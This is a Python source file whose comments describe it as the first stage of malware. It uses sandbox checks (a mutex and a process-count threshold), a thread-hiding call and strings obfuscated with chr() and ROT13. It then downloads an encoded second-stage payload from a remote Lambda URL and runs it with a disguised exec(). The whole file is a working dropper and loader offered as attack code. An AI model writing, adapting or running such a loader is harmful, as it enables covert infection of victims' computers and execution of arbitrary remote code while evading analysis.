# This file contains code for the first stage of the malware execution, it will do some initial checks for VM/sandbox and than acordingly
# donwload and dynamically execute the second stage code from a remote url 


# Importing the neccesary modules

import builtins
from time import sleep 
from sys import exit, _MEIPASS, argv
from base64 import b64decode
from random import randint, shuffle, choices
from ctypes import wintypes, WinDLL, CFUNCTYPE, c_void_p, c_int, c_char_p, POINTER


try:
    # base64 deocde the passed data
    def ravenSlay(code):
        return b64decode(code).decode("utf-8")

    # Rot 13 decryption function and encryption function
    def ravenSong(text: str, t: str) -> str:
        result = []
        o = ''
        for char in text:
                if 'a' <= char <= 'z':  
                    result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
                elif 'A' <= char <= 'Z':
                    result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
                else:
                    result.append(char)
        o = ''.join(result)
        if t == 'j':  # chr(106)
            return o
        elif t == 'd':  # chr(100)
            return o.replace("$", " ").replace(";", "\n").replace("@", ",")
        else:
            return ''

    # Load the helper library
    elist = ["cyhtva.qyy", "349C5VXX83qEnLALca935"]
    #  0 -> the main helper dll , 1 -> Mutex Name of the binary at runtime
    
    # enumerate and decrypt required strings
    for k,y in enumerate(elist):
        elist[k] = ravenSong(y, "d")

    # Import os module for system interaction
    os = __import__(f'{chr(100+10+1)}{chr(100+10+5)}')
    # Load the helper dll to expose additional low level functions
    handle = WinDLL(os.path.join(_MEIPASS,elist[0]))
    k32h = WinDLL(f'{chr(107)}{chr(101)}{chr(114)}{chr(100+10)}{chr(101)}{chr(108)}{chr(51)}{chr(50)}{chr(46)}{chr(100)}{chr(108)}{chr(108)}', use_last_error=True)
    gprocaddr = k32h.GetProcAddress
    gprocaddr.argtypes = [wintypes.HMODULE, wintypes.DWORD]
    gprocaddr.restype = c_void_p
    d_handle = handle._handle
    mut_n = elist[1]
    
    # Make mutex, if active in system than exit
    cmut = gprocaddr(d_handle, 7)
    cmutex = CFUNCTYPE(c_int, c_char_p)(cmut)
    mres = cmutex(mut_n.encode("utf-8"))
    if mres == 1:
        exit()
        
    # Hide thread
    hthread = gprocaddr(d_handle, 21)
    hhthread = CFUNCTYPE(c_int)(hthread)
    res = hhthread()
    
    # Check number of processes, if less than or equal to 150 than exit
    num_procs = gprocaddr(d_handle, 31)
    nu_proc = CFUNCTYPE(c_int)(num_procs)
    res = nu_proc()
    if res <= 150:
        exit(0)
        
    # extract the get module from hidden import requests
    get = getattr(__import__(f'{chr(114)}{chr(101)}{chr(113)}{chr(117)}{chr(101)}{chr(115)}{chr(116)}{chr(115)}'), f'{chr(103)}{chr(101)}{chr(116)}')
    
    # Set the custom header to mimic browser
    head = {
        "User-Agent": "Mozilla/5.0...",
        "Accept": "text/html,application/xhtml+xml,...",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://www.google.com/",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "DNT": "1",
        "val": "payload",
        "Cache-Control": "max-age=0",
    }
    # Download the second stage payload from a rot13 encrypted lambda function
    surl = ravenSong("uggcf://wjm6xebyefclr4slqctvem2kk40ajglg.ynzoqn-hey.pn-prageny-1.ba.njf/", "j") 
    s2_payload = get(surl, headers = head, timeout=(2,6))
    if s2_payload.status_code == 200:
        if s2_payload.text == "Die":
            exit(0)
        ready_payload = ravenSlay(s2_payload.text)
        decrypted_payload = ravenSong(ready_payload,"d")
        # dynamically import exec function
        OOO__ = getattr(builtins, '$>e^'.replace('>', 'x').replace('$', 'e').replace('^', 'c'))
        # Dynamically execute the fetched payload after decryption
        OOO__(decrypted_payload)
    else:
        exit(0)
except Exception as o:
    print(o)
    exit(0)
